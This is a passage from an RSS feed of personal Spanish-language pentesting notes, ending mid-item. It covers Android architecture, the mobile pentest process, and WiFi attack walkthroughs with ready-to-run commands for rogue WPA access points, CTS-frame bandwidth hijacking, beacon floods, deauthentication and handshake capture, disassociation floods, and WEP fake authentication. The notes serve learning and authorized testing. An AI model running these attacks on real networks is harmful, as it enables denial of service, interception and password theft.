Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/2.-dynamic-analysis/android-mobile-app-dynamic-analysis.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Mobile Applications/Android/2. Dynamic Analysis/Android Mobile App Dynamic Analysis.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 29 May 2024 19:19:09 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/creating_a_new_proxy_burpsuite.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/creating_a_new_proxy_burpsuite.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Android Architecture]]></title><description><![CDATA[ 
 <br><br>La arquitectura de Android se basa en una combinación de hardware específico y una píla de software que incluye el sistema operativo Android, el cual está basado en el Kernel de Linux, lo que implica que muchas funcionalidades, usos y comportamientos de Linux (<a data-href="0. Linux Basics" href="https://dobliuw.com/notes/3.-system/operative-systems/linux/0.-linux-basics.html" class="internal-link" target="_self" rel="noopener nofollow">0. Linux Basics</a>) se pueden llevar acabo en este dispositivo.<br><br>
<br>Processor (CPU):

<br>Los teléfonos Android utilizan procesadores basados en arquitecturas ARM o, en algunos casos, x86.
<br>Los procesadores modernos suele ser multinúcleo (quad-core, octa-core) para mejorar el rendimiento y la eficiencia energética.


<br>Memory (RAM):

<br>Los dispositivos Android viene con varias capacidades de RAM, desde 2GB hata más de 12 GM en los modelos de gama alta.
<br>La RAM es crucial para el rendimiento del sistema y la multitarea.


<br>Storage:

<br>Incluye almacenamiento interno (Flash NAND) y opciones para almacenamiento externo (Tarjetas microSD).
<br>La capacidad de almacenamiento varía desde 16GB hasta 1TB o más.


<br>Peripherals and Sensors:

<br>Pantalla táctil, cámaras, sensores de proximidad, acelerómetros, giroscopios, GPS, sensores de huellas dactilares, etc.


<br>Communication modules:

<br>Wi-Fi, Bluetooth, NFC, LTE/5G, etc.


<br><br>
<br>Linux Kernel:

<br>El núcleo de Android es una versión modificada del kernel de Linux.
<br>Gestiona recursos de hardware, seguridad y comunicación entre componentes de darware y software.


<br>Hardware Abstraction Layer (HAL):

<br>Proporciona interfaces estándar para interactuar con el hardware específico del dispositivo.
<br>Permite que los fabricantes implementen controladores para su hardware específico.


<br>Android Runtime:

<br>ART (Android Runtime) compila y ejecuta las aplicaciones Android (Cada aplicación se ejecuta en una máquina virtual, esta máquina virtual es ART) ART sustituyó a Dalvik en versiones posteriores a Android 4.4 (KitKat), actualmente sigue siendo referenciada con el nombre Dalvik bytecode, aunque esta no es utilizada en Android OS modernos.
<br>Incluyen bibliotecas de C/C++ usadas por varios componentes del sistema y aplicaciones.


<br>Application Frameworks:

<br>Proporciona las APIs y servicios que utilizan las aplicaciones de Android.
<br>Incluye gestores de actividades, recursos, notificaciones, entanas, contenidos, etc.


<br>System Application:

<br>Conjunto de aplicaciones básicas como el marcador, contactos, navegador, etc.
<br>Estas aplicaciones proporcionan funcionalidades esenciales y sirven como referencia para los desarrolladores.


<br><br>
<br>Bootloader:

<br>Código que se ejecuta al encender el dispositivo.
<br>Verifica y carga el kernel de Linux y la imagen del sistema.


<br>Linux Kernel:

<br>Inicializa el hardware y monta el sistema de archivos raíz.
<br>Iniciael proceso init.


<br>init Process:

<br>Proceso de inicio del sistema que configura y lanza los servicios del sistema Android.
<br>Lee los archivos de configuración (init.rc) para arracnar los servicios y demonios necesarios.


<br>System Services:

<br>Incluyen Service Manager, Zygote, System Server y otros servicios esenciales.

<br>Zygote: Preinicializa el entorno de ejecución para las aplicaciones Android.
<br>System Server: INicia y gestiona los serivcios principales del sistema como Activity Manager, Package Manager, etc.




<br><br>
<br>Security module based on Linux:

<br>Cada aplicación Android se ejecuta en su propio proceso con un ID de usuario único (UID), lo que proporciona aislamiento a nivel de proceso.
<br>Utiliza mecanismos de control de acceso basados en permisos que deben ser concedidos por el usuario.


<br>SELinux (Security-Enhanced Linux):

<br>Implementa la política de seguridad obligatorias (MAC) para controlar las acciones que puedan realizar los procesos.


<br>Sandboxing:

<br>Las aplicaciones se ejecutan en un entorno aislado (Sandbox) para limitar el acceso no autorizado a los recursos del sistema.


<br><img alt="android_architecture.png" src="https://dobliuw.com/lib/media/android_architecture.png"><br>
Arquitectura de Android.<br>
<br>Recursos: 

<br><a data-tooltip-position="top" aria-label="https://source.android.com/docs/security/overview/app-security" rel="noopener nofollow" class="external-link" href="https://source.android.com/docs/security/overview/app-security" target="_blank">Documentación Oficial de Seguridad en Android</a>. 
<br><a data-tooltip-position="top" aria-label="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05a-platform-overview" rel="noopener nofollow" class="external-link" href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05a-platform-overview" target="_blank">Mobile Pentest Gitbook</a>.


<br><br><br>
<br>Primary User: Este es el usuario que se crea la primera vez que el dispositivo se incia, siempre esta corriendo y solo puede ser eliminador reseteando el dispositivo de fábrica.
<br>Secondary User: Este es un usuario adiciona que se puede agregar al dispostivivo y solo puede ser agregado o eliminado por el usuario primario.
<br>Guest User: Solo puede haber un usuario invitado a la vez, es una manera rápida de obtener acceso de invitado al dispositivo.
<br>Kid Mode: Google Kids Spaces (Solo en Tablets), Perfiles o cuentas para niños usualmente el fabricante específica el Samsung Kid Mode.
]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/0.-android-architecture.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Mobile Applications/Android/0. Android Architecture.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 17 May 2024 21:04:50 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/android_architecture.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/android_architecture.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Process]]></title><description><![CDATA[ 
 <br><br>El proceso para realizar pentesting a aplicaciones móviles es muy similar al que llevamos a cabo en auditorias de pentesting a sistemas, en este caso contamos con cuatro fases, reconocimiento, análisis estático, análisis dinámico y reporte. <br><br><br>Objetivo: Obtener toda la información posible sobre la aplicación móvil target para entender su estructura, funcionalidad y vectores potenciales de ataque.<br>Identify Application Platform<br>
<br>Determinar si la aplicación es para Android, iOS o Ambos.<br>
Collect Basic Information
<br>Recolectar información básica, como nombre de aplicación, version, package name (Android), bundle indetifier (iOS), información pública de los desarrolladores, etc.<br>
Gather Application Resources
<br>Obtener archivos APK (Android Package) para Android, archivos IPA (iOS App Store Package) para iOS.<br>
Network Traffic Analysis
<br>Capturar tráfico de red haciendo uso de herramientas como wireshark o tcpdump.
<br>Identificar endpoints de API, protocolos de comunicación utilizados y métodos de transmisión de datos.<br>
Review Documentation
<br>Análizar la descripción de la app en la tienda, reviews de usuarios y documentación de desarrolladores de ser posible.
<br>Identificar funcionalidades anunciadas y quejas o problemas conocidos y reportados.
<br><br>Objetivo: Analizar la aplicación sin ejecutarla para identificar potenciales fallas de seguridad en el código y/o de configuración.<br>Decompile/Disassemble<br>
<br>Hacer uso de herramientas como JADX, APKTool (Para Android), o IDA PRO, Hopper (Para iOS) para decompilar las apps.
<br>Extraer código fuente y recursos para análizar.<br>
Review Source Code
<br>Hacer búsqueda de secrets, credenciales y API keys.
<br>Identificar prácticas inseguras de código como el manejo inadecuado de errores, falta de validación de entradas, etc.<br>
Analyze Configuration Files
<br>Inspeccionar AndroidManifest.xml (En Android) o Info.plist (En iOS) para búsqueda de información sensible y de permisos.
<br>Asegurarse de que los permisos apropiados son requeridos de manera adecuada y minimizar la superficie de ataque.<br>
Check for Vulnerable Libraries
<br>Identificar el uso de librerías externas y revisar por vulnerabilidades conocidas haciendo uso de herramientas como Retire.js o Snyk.
<br><img alt="static_analysis_mobile_pentesting.png" src="https://dobliuw.com/lib/media/static_analysis_mobile_pentesting.png"><br><br>Objetivo: Interactucar con la aplicación en un entorno en tiempo real para identificar vulnrabilidades que no aparecen en el análisis estático.<br>Set Up Testing Enviroment<br>
<br>Hacer uso de emuladores o dispositivos reales con el debugging ativado.
<br>Configurar herramientas de proxy como BurpSuite, OWASP ZAP o proxyman para interceptar y análizar el tráfico.<br>
Runtime Behavior Analysis
<br>Supervisar el comportamiento de la aplicación haciendo uso de herramientas como Frida o Xposed Framework. 
<br>Identificar almacenamiento inseguro de datos, manejo de sesiones inapropiados y accesos no autorizados.<br>
API Testing
<br>Interceptar y modifcar los request y respuestas a la API para búsqueda de vulnerabilidades típicas como <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a>, <a data-href="NoSQLI - (NoSQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/nosqli-(nosql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">NoSQLI - (NoSQL Injections)</a>, <a data-href="XSS  - ( Cross-Site Scripting )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xss-(-cross-site-scripting-).html" class="internal-link" target="_self" rel="noopener nofollow">XSS  - ( Cross-Site Scripting )</a>, entre otras.<br>
Testing for Binary Protections
<br>Revisar por implementaciones de protección como obfuscation, tamper detecion y root/jailbreak detection.<br>
Exploit Testing
<br>Intentar explotar las vulnerabilidades encontradas para confirmar su presencia y impacto potencial.
<br><br>Objetivo: Documentar las vulnerabilidades encontradas, el posible impacto de estas y proveer recomendaciones para la remediación.<br>Executive Summary<br>
<br>Proveer una descripción high-level sobre los hallazgos, la evaluación general de riesgos y las recomendaciones claves.<br>
Datailed Findings
<br>Documentar cada vulnerabilidad con:<br>
- Descripción de la falla o problema.<br>
- Pasos para reproducir a la misma.<br>
- Evidencia (Screenshots, framentos de código, logs, etc).<br>
- Evaluación de impacto.<br>
- Puntaje de CVSS (Si aplica).<br>
Remediation Recommendations
<br>Proveer pasos accionables para solventar cada vulnerabilidad o problema hayado.
<br>Sugerir mejores practicas para un desarrollo seguro.<br>
Risk Assassment
<br>Evaluar la postura de seguridad general de la aplicación.
<br>Priorizar las vulnerabilidades en función de su impacto y probabilidad de explotación.<br>
Appendices
<br>Incluir datos como revisiones completas del código, registros de tráfico de red o resultados detallados de las herramientas utilizadas.
]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/mobile-application-penetration-testing-process.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Mobile Applications/Mobile Application Penetration Testing Process.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:33:51 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/static_analysis_mobile_pentesting.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/static_analysis_mobile_pentesting.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[AP Rogue WPA]]></title><description><![CDATA[ 
 <br><br>Un ataque Access Point Rogue WiFi Protected Access (AP Rogue WPA) implica en la creación de un punto de acceso falso que imite a un ap legítimo, con el objetivo de engañar a los usuarios para que se conecten a este y así capturar sus datos. <br><br><br>Lo primero que necesitamos llevar a cabo es la configuración de la interfaz en modo monitor.<br>sudo ip link set {interface} down

sudo iw dev {interface} set type monitor

sudo ip link set {interface} up
Copy<br>Adicionalmente, para evitar conflictos con la creación del punto de acceso es importante que la configuración de canal del mismo coincida con la configuración de canal que usa nuestra interfaz.<br># Check interface info
sudo iw dev {interface} info
# Set a specific channel 
sudo iw dev {interface} set channel 6
Copy<br>Ahora necesitamos hacer es instalar la herramienta hostapd la cual nos permitirá crear puntos de acceso Wi-Fi.<br># In linux devices
sudo apt-get install hostapd
# In devices like Wi-Fi Pineaple Mark VII
opkg install hostapd
Copy<br>Tras la instalación de esta herramienta, necesitaremos crear un archivo de configuración para que hostapd pueda hacer uso de esta para la configuración y creación del falso AP.<br>
<br>/etc/hostapd/hostapd-wpa.conf
<br>interface={interface}
driver=nl80211
ssid={fake_ssid_name}
channel={channel}
hw_mode=g
wpa=2
wpa_passphrase={password_to_use}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
Copy<br>Una vez creado el archivo de configuración deberemos llevar a cabo la configuración de DNS y DHCP para que los clientes puedan conectarse al AP y recibir una dirección IP, para esto necesitaremos configurar un servidor DHCP y redirigir el tráfico DNS. Haremos uso de la herramienta dnsmasq. <br># In linux devices
sudo apt-get install dnsmasq
# In devices like Wi-Fi Pineaple Mark VII
opkg install dnsmasq
Copy<br>Una vez instalada la misma deberemos, una vez más, crear el archivo de configuración.<br>
<br>/etc/dnsmasq.conf (Ejemplo de segmento de red 192.168.2.0)
<br>interface={interface}
dhcp-range=192.168.2.10,192.168.2.100,12h 
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
address=/#/192.168.2.1
Copy<br>Tras la creación de estas configuraciones, tenemos que configurar la red, es decir nuestra interfaz:<br>ifconfig {interface} 192.168.2.1 netmask 255.255.255.0 up
Copy<br>Una vez configurada nuestra red, debemos iniciar tanto hostapd como dnsmasq con sus respectivas configuraciones...<br># Starting hostapd with specific conf
hostapd /etc/hostapd/hostapd-wpa.conf
# Start dnsmasq using a config file 
dnsmasq -C /etc/dnsmasq.conf
Copy<br>Por último, simplemente deberíamos configurar el IP Forwarding y configurar NAT (Network Address Translation) para que finalmente los clientes puedan navegar.<br>
<br>Habilitar IP Forwarding
<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
Copy<br>
<br>Configurar NAT (En el ejemplo se utiliza eth0 como interfaz con acceso a internet)
<br>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i {interface_created} -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o {interface_created} -j ACCEPT
Copy<br>
<br>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE: Regla de iptables que hace que todo el tráfico saliente desde cualquier interfaz se enmascare como si viniera desde nuestra interfaz con acceso a internet (eth0), permitiendo que los paquetes salgan a internet.   qu
]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/ap-rogue-wpa.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/0. Simple WiFi Hacking/AP Rogue WPA.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 07 Jun 2024 21:22:36 GMT</pubDate></item><item><title><![CDATA[Bandwidth Hijacking]]></title><description><![CDATA[ 
 <br><br>El ataque de scuestro de ancho de banda o Bandwidth Hijacking consiste en que el atacante consume gran parte del ancho de banda disponible en la red, limitando la cantidad de ancho de banda que está disponible para los usuarios legítimos. Este ataque se basa en los mecanismos de control de acceso al medio utilizados en redes inalámbricas, como RTS y CTS.<br>Info




<img alt="RTS.png" src="https://dobliuw.com/lib/media/rts.png">
<br>Info



<img alt="CTS.png" src="https://dobliuw.com/lib/media/cts.png">
<br><br><br>Este ataque consiste en modificar un paquete CTS para generar un tráfico elevado, generar colisiones de datos y saturación en el ancho de banda. <br>Para realizar esto, primero necesitamos capturar brevemente el tráfico de la red para conseguir un paquete CTS y posteriormente editarlo. <br>airodump-ng --essid {essid} -c {channel} -w {file.cap} {interfaz}
Copy<br>Una vez que dejemos correr unos segundos, podemos terminar la intercepción del tráfico de red, y podemos comenzar a ver los paquetes CTS y analizar todo el tráfico obtenido con herramientas como tshark o wireshark. <br># -Y para filtrar 
# -Tjson para ver en formato json
# -Tfields -e wlan.duration para filtrar por parametros
# 0x1C es el tipo/subtipo para CTS
tshark -r {file.cap} -Y "wlan.fc.type_subtype == 0x1C" 
Copy<br>En caso de utilizar wireshark en el apartado de "Apply a display filter" introducimos wlan.fc.type_subtype == 0x1C<br>wireshark {file.cap} &amp;&gt;/dev/null &amp; disown
Copy<br>Una vez seleccionado dicho paquete nos dirigimos a file &gt; Export specified packets &gt; Select packets only &gt; guardar para guardar el mismo.  <br>Una vez que tengamos el arhivo guardado, por ejemplo, CTS.cap, podremos ver de manera previa que dicho paquete cuenta con una "duración", la cual tenemos que modificar como objetivo. <br><br><img alt="CTS_time_ws.png" src="https://dobliuw.com/lib/media/cts_time_ws.png"><br><br>tshark -r CTS.cap -Tjson
Copy<br><img alt="CTS_time_ts.png" src="https://dobliuw.com/lib/media/cts_time_ts.png"><br><br>Ahora solo queda editar la duración en la que los paquetes CTS comunican que la conexión esta "libre", intentaremos modificar dicho valor del paquete por el valor de 30000 para asi intentar lograr saturar la red. <br>Para esto utilizaremos una herramienta lamada ghex para editar los valores de esta captura. <br>sudo ghex CTS.cap &amp;&gt;/dev/null &amp; disown
Copy<br><img alt="ghex_cts.png" src="https://dobliuw.com/lib/media/ghex_cts.png"><br>Nos fijamos que valores exadecimales pertenecián al "duration time" en wireshark, para eso abrimos el paquete CTS, hacemos doble click, y en la pestaña que se nos abre, tocamos  ....Duration: ...... y veremos su valor hexadecimal: <br><img alt="CTS_ws_time.png" src="https://dobliuw.com/lib/media/cts_ws_time.png"><br>En este caso 88 00, entendiendo que estos valores tendran que ser remplazados con la herramienta de ghex.<br>
Como queremos remplazar estos 136 microseconds por 30000, es necesario ver el valor hexadecimal de esto, y esto lo podemos hacer con python3 <br>hex(30000)
Copy<br>Dando como valor 0x7530 teniendo que modificarlo en ghex como 30 75, quitando el 0x e invirtiendo los valores...<br><img alt="ghex_edit_time.png" src="https://dobliuw.com/lib/media/ghex_edit_time.png"><br>De esta manera si lo volvieramos a ver con tshark o wireshark veriamos que tendriamos una duración de 30000, por lo que solo falta replicar el paquete CTS editado. <br>tcpreplay --intf1={interfaz} --topspeed --loop=2000 {CTS_edited.pcap} 2&gt;/dev/null
Copy<br>De esta manera estariamos utilizando nuestra tarjeta de red para tramitar 2000 paquetes CTS de duración de 30000. Incluso podriamos interceptar el tráfico de red y filtrar por paquetes CTS para corroborar el envío de estos paquetes. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/bandwidth-hijacking.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/0. Simple WiFi Hacking/Bandwidth Hijacking.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 08 Jun 2024 02:23:06 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/rts.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/rts.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Beacon Flood Attack]]></title><description><![CDATA[ 
 <br><br>El ataque Beacon Flood consiste en enviar una gran cantidad de tramas Beacon falsas a una red inalámbrica. Estas tramas anuncian puntos de acceso inexistente, saturando la tabla de redes de los dispositivos cercanos y causando congestión. Este ataque puede relentizar la detección de redes y dificultar las conexiones legítimas<br><br><br>Como vimos en la fase de <a data-href="0. Hacking WiFi#Pre-Explotación" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/0.-hacking-wifi.html#Pre-Explotación" class="internal-link" target="_self" rel="noopener nofollow">0. Hacking WiFi &gt; Pre-Explotación</a>, es necesario llevar a cabo ciertas configuraciones previas para poner nuestra interfaz en modo monitor, matar ciertos procesos, etc. Una vez realizado esto podríamos hacer uso de la herramienta mdk3, junto a aireplay-ng para la creación de APs falsos y el envío de las tramas.<br># -a Randoms SSIDs
# -g Incremental SSIDs
sudo mdk3 {interface} b -n {fake_network_ssid} -a -g
# Create Fakes AP based on a wordlist
# -s Speed per second
# -c Specify channel
# -f Use filename
for n in $(seq 1 10); do echo "Network$n" &gt;&gt; {file_name}; done
sudo mdk3 {interface} b -f {file_name} -a -s 2000 -c {channel}
Copy<br>De esta manera tras la ejecución de estos comandos podríamos visualizar la creación de múltiples puntos de accesos con nombres aleatorios o especificos según lo que busquemos, pero con el finde de intentar saturar la tabla de  redes de los dispostivios cercanos, causando así una congestión en el mismo.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/beacon-flood-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/0. Simple WiFi Hacking/Beacon Flood Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 08 Jun 2024 01:46:36 GMT</pubDate></item><item><title><![CDATA[Deautentication Attack]]></title><description><![CDATA[ 
 <br><br>El ataque de deautenticación es un tipo de ataque de denegación de servicio (DoS) en redes inalámbricas, donde se envían paquetes de deautenticación a un cliente conectado a un punto de acceso (AP), forzando su desconexión para capturar handshakes. Este ataque es útil para capturar handshakes de redes WPA/WPA2 o interrumpir conexiones de red.<br>Un handshake en redes Wi-Fi es un proceso de aunteticación y negociación que se lleva a cabo entre un cliente y un AP cuando el cliente intenta conectarse a la red. En el contexto de redes WPA/WPA2, el 4-way handshake es un proceso de cuatro pasos que asegura que tanto el cliente como el AP tienen la misma clave precompartida (PSK - Pre Shared Key)  y negocian una clave temporal para cifrar el tráfico de la sesión.<br>El 4-way handshake en WPA/WPA2 se realiza en los siguientes pasos:<br>
<br>El AP envía un nonce (Número aleatorio) al cliente.
<br>El cliente genera su propio nonce y lo venía al AP junto con una vesión cifrada del nonce del AP usando la PSK.
<br>El AP verfica la información recibida, genera una clave temporal (PTK) y la envía cifrada al cliente.
<br>El cliente configra la recepción de la clave temporal (PTK) y la conexión se establece
<br>Por lo que la idea de este ataque, es poder deautenticar a clientes de un AP forzando su reconexión para captura el handshake el cual contiene la contraseña cifrada de la víctima y así, posteriormente y de manera offline, poder intentar crackear y descifrar la misma.<br>Representación visual de este ataque: [[DEAUTHENTICATION_ATTACK_draw].]<br><br><br>Como vimos en la fase de <a data-href="0. Hacking WiFi#Pre-Explotación" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/0.-hacking-wifi.html#Pre-Explotación" class="internal-link" target="_self" rel="noopener nofollow">0. Hacking WiFi &gt; Pre-Explotación</a>, es necesario llevar a cabo ciertas configuraciones previas para poner nuestra interfaz en modo monitor, matar ciertos procesos, etc. Una vez realizado esto, haciendo uso de la herramienta aireplay-ng podremos llevar acabo distintos tipos de ataques, entre ellos, el ataque de deautenticación.<br>
<br>Emitir una determinada cantidad de paquetes de deautenticación a un cliente conectado al AP víctima hasta que usemos Ctrl + C
<br>sudo aireplay-ng -0 {packages_to_send} -e {ssid_name} -c {client_mac} {interface}
Copy<br>Luego de capturar el handshake, para válidar que el mismo fue capturado correctamente, podríamos hacer uso de aircrack-ng.<br>sudo aricrack-ng {capture}.cap
Copy<br>Donde deberiamos buscar el mensaje [ WPA handshake: &lt;BSSID&gt; ] para confirmar la captura exitosa del mismo.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/deautentication-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/0. Simple WiFi Hacking/Deautentication Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 08 Jun 2024 01:51:04 GMT</pubDate></item><item><title><![CDATA[DEAUTHENTICATION_ATTACK_draw]]></title><description><![CDATA[ 
 
  
  
  
    
  
  AP (Access Point)DispositivosAtacante2Conexión a la red estable31Paquetes de Deautenticación4PSK67HandShake51)2)3)4)5)6)7)Existe una conexión estable entre el/los dispositivo/s.El atacante se pone a interceptar el tráfico de la red.El atacante comienza a emitir paquetes de deautenticación a la red.El/los dispositivo/s victima/s pierden la conexión.El atacante frena el ataque  para permitirle al/los dispositivo/s victima/s intentar reconectaresEl/los dispositivos victimas envían la PSK (Pre Shared Key) al AP para reconectarseEl atacante intercepta el Handshake.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/deauthentication_attack_draw.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/0. Simple WiFi Hacking/DEAUTHENTICATION_ATTACK_draw.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 18 Jan 2024 17:56:49 GMT</pubDate></item><item><title><![CDATA[DISASSOCIATION AMOK MODE]]></title><description><![CDATA[ 
 <br><br>El ataque Disassociation AMOK mode o Desasociación AMOK mode explota una vulnerabilidad en el protoclo de autenticación y asociación del AP. Durante el proceso de conexión, el cliente envía un paquete de asociación al AP solicitando la conexión, y el AP responde con una confirmación. Este ataque consiste en enviar una gran cantidad de paquetese de desasociación falsificados a los clientes, forzándolos a desconectarse y generando tráfico execesivo en la red. Esto puede sobrecargar tanto a los clientes como al AP, provocando desconexiones frecuentes de los clientes legítimos.<br><br><br>Como vimos en la fase de <a data-href="0. Hacking WiFi#Pre-Explotación" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/0.-hacking-wifi.html#Pre-Explotación" class="internal-link" target="_self" rel="noopener nofollow">0. Hacking WiFi &gt; Pre-Explotación</a>, es necesario llevar a cabo ciertas configuraciones previas para poner nuestra interfaz en modo monitor, matar ciertos procesos, etc. En este caso podríamos hacer uso de la herramienta mdk3 para utilizar la funcionalidad de emisión de tramás de desasociación o, también podríamos hacer uso de herramientas como tshark / wireshark y tcpreplay.<br><br>Lo primero que tenemos que hacer es crear una blacklist (Lista de clientes a desasociar) o whitelist (Lista de direcciones mac permitidas).<br>echo '00:11:22:33:44:55' &gt; blacklist.txt
Copy<br>Una vez creada la list, podríamos hacer uso de la herramienta mkd3 para enviar tramas de desasociación a los clientes de, en este ejemplo, la blackslit.<br>sudo mdk3 {interface} d -w blacklist.txt -c {channel}
Copy<br><br>Lo primero que tenemos que hacer es capturar el tráfico de red para obtener tramas de desasociación.<br>sudo tshark -i {interface} -Y "wlan.fc.type_subtype == 0xA" -w {capture}.cap
Copy<br>En caso de querer hacer uso de wireshark, podríamos usar el filtro de visualización wlan.fc.type_subtype == 0xA. <br>Nuevamente, similar al ataque <a data-href="Bandwidth Hijacking#Editing package" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/bandwidth-hijacking.html#Editing_package" class="internal-link" target="_self" rel="noopener nofollow">Bandwidth Hijacking &gt; Editing package</a>, haremos uso de la herramienta ghex o cualquier editor hexadecimal para modificar las tramas de desasociación a gusto.<br>Tras la edición de estas tramas, haremos uso de tcpreplay para enviar repetidamente las tramas de desasociación modificadas.<br>sudo tcpreplay --intf1={interface} --topseepd --loop=2000 {deauth_modified_package}.pcap
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/disassociation-amok-mode.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/0. Simple WiFi Hacking/Disassociation amok mode.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 25 Jun 2024 13:54:27 GMT</pubDate></item><item><title><![CDATA[Fake Autentication]]></title><description><![CDATA[ 
 <br><br>El ataque de falsa autenticación se utiliza para conectarse a un AP como si fueramos un cliente legítimo. Este ataque es epecialmente relevante en redes WEP, donde se fuerza al AP a aceptar la conexión de un atacante, permitiendo así la captura y generación de tráfico para posteriores análisis y crackeo de la clave WEP.<br><br><br>Como vimos en la fase de <a data-href="0. Hacking WiFi#Pre-Explotación" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/0.-hacking-wifi.html#Pre-Explotación" class="internal-link" target="_self" rel="noopener nofollow">0. Hacking WiFi &gt; Pre-Explotación</a>, es necesario llevar a cabo ciertas configuraciones previas para poner nuestra interfaz en modo monitor, matar ciertos procesos, etc. Una vez realizado esto, podemos hacer uso de la herramienta aireplay-ng para enviar una solicitud de autenticación falsa al AP.<br>sudo aireplay-ng --fakeauth 0 -a {bssid_ap} -h {our_interface_mac} {interface}
Copy<br>Para verificar que la falsa autenticación fue exitosa, puedes observar la salida de aireplay-ng donde la misma debería indicar que la autenticación fue aceptada por el AP, viendo algo como:<br>Sending Authentication Request
Autehtnication successful
Copy<br>Opcionalmente tras una exitosa falsa autenticación podríamos generar tráfico en la red haciendo usos de otros ataques como la reinyección de paquetes ARP.<br>sudo aireplay-ng --arpreplay -b {bssid_ap} -h {out_interface_mac} {interface}
Copy<br>Es importante tener en cuenta que estos ataques se utilizan principalmente contra redes WEP, que son inseguras y obsoletas. Las redes modernas que utilizan WPA/WPA2/WPA3, son más seguras.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/0.-simple-wifi-hacking/fake-autentication-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Networks/Attacks/0. Simple WiFi Hacking/Fake Autentication Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 07 Jun 2024 23:38:37 GMT</pubDate></item><item><title><![CDATA[HandShake Cracking]]></title><description><![CDATA[ 
